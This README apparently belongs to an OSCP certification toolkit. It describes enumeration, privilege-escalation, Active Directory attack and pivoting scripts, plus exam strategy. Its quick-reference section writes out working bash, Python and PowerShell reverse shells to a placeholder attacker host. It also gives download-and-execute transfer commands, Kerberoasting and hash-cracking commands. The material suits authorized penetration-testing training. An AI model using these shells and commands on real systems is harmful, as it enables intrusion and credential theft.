# OSCP Exam Toolkit

Scripts and resources for the Offensive Security Certified Professional (OSCP) exam.

---

## ⚠️ Legal Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY**

The tools, scripts, and techniques contained in this repository are provided for educational purposes and for use in authorized security testing environments only, such as the OSCP certification exam labs and other explicitly permitted engagements.

By using this toolkit, you acknowledge and agree that:

1. **Authorization Required**: You will only use these tools against systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal.

2. **No Liability**: The author(s) of this toolkit accept no responsibility or liability for any misuse, damage, or illegal activity resulting from the use of these materials. You assume full responsibility for your actions.

3. **Compliance with Laws**: You are solely responsible for ensuring your use of these tools complies with all applicable local, state, federal, and international laws and regulations.

4. **No Warranty**: This toolkit is provided "as is" without warranty of any kind, express or implied. The author(s) make no guarantees regarding the accuracy, reliability, or completeness of the information provided.

5. **Ethical Use**: These materials are intended to help security professionals learn defensive techniques by understanding offensive methodologies. Always practice ethical hacking principles.

**If you do not agree to these terms, do not use this toolkit.**

---

## Exam Structure

| Target | Points | Notes |
|--------|--------|-------|
| Standalone #1 | 20 pts | 10 user + 10 root |
| Standalone #2 | 20 pts | 10 user + 10 root |
| Standalone #3 | 20 pts | 10 user + 10 root |
| AD Client #1 | 10 pts | |
| AD Client #2 | 10 pts | |
| AD Domain Controller | 20 pts | |
| **Total** | **100 pts** | **70 pts to pass** |

### Metasploit Rules
- ✅ ONE standalone machine (your choice)
- ❌ NOT allowed on AD set

---

## Scripts

### 1. `oscp-enum.sh` - Initial Enumeration
Run on each target immediately to gather comprehensive information.

```bash
./oscp-enum.sh <target_ip> [output_dir]
```

**What it does:**
- Quick + Full TCP nmap scans
- UDP top 20 ports
- Service-specific enumeration (HTTP, SMB, LDAP, FTP, etc.)
- Web directory brute forcing
- SMB share enumeration

### 2. `linux-privesc.sh` - Linux Privilege Escalation
Run on Linux targets after gaining initial shell.

```bash
# Transfer to target
wget http://KALI_IP/linux-privesc.sh
chmod +x linux-privesc.sh
./linux-privesc.sh
```

**Checks:**
- SUID/SGID binaries
- Sudo permissions
- Capabilities
- Cron jobs
- Writable files/directories
- Credentials/SSH keys
- Kernel version

### 3. `windows-privesc.ps1` - Windows Privilege Escalation
Run on Windows targets after gaining initial shell.

```powershell
# Transfer and run
iwr http://KALI_IP/windows-privesc.ps1 -OutFile wp.ps1
.\wp.ps1
```

**Checks:**
- User privileges (SeImpersonate, etc.)
- Unquoted service paths
- AlwaysInstallElevated
- Stored credentials
- Scheduled tasks
- Registry autoruns

### 4. `ad-attack.sh` - Active Directory Attacks
For the AD set - you receive initial credentials.

```bash
./ad-attack.sh <dc_ip> <domain> <username> <password>
```

**What it does:**
- User/group enumeration
- Share enumeration
- BloodHound data collection
- Kerberoasting
- AS-REP Roasting
- Provides lateral movement commands

### 5. `ligolo-setup.sh` - Pivot Setup
Set up ligolo-ng for pivoting into internal networks.

```bash
./ligolo-setup.sh [interface_name] [proxy_port]
```

**Guides you through:**
- TUN interface creation
- Proxy startup
- Agent transfer
- Route addition
- Double pivot setup

### 6. MSF Directory - Metasploit Resources

```bash
# Start handler
msfconsole -r msf/reverse_tcp_handler.rc

# Generate all payloads
./msf/generate_payloads.sh <LHOST> <LPORT>

# Reference exploits
cat msf/common_exploits.rc
```

---

## Exam Strategy

### Time Allocation (~24 hours)
| Phase | Time | Goal |
|-------|------|------|
| Initial Enum | 1-2 hrs | Scan all 6 targets |
| Standalone #1 | 3-4 hrs | Both flags |
| Standalone #2 | 3-4 hrs | Both flags |
| Standalone #3 | 3-4 hrs | Both flags (MSF if needed) |
| AD Set | 6-8 hrs | Full domain compromise |
| Buffer | 2-3 hrs | Stuck machines |

### When to Use Metasploit
- Save for a machine where manual exploitation is tedious
- Don't burn it early
- Consider using after 4+ hours stuck on a standalone

### AD Attack Flow
1. Use provided credentials to enumerate
2. Run BloodHound, look for attack paths
3. Kerberoast/AS-REP roast
4. Check shares for credentials
5. Pivot with obtained creds (ligolo-ng)
6. Dump secrets when you reach DC

---

## Quick Reference

### File Transfer
```bash
# Python HTTP server
python3 -m http.server 80

# Windows download
certutil -urlcache -f http://KALI/file.exe file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI/file','file')"

# Linux download
wget http://KALI/file
curl http://KALI/file -o file
```

### Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/KALI_IP/PORT 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('KALI_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

### Shell Upgrade
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Hash Cracking
```bash
# Hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt  # Kerberos
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt       # AS-REP
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt         # NTLM

# John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## Resources
- [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

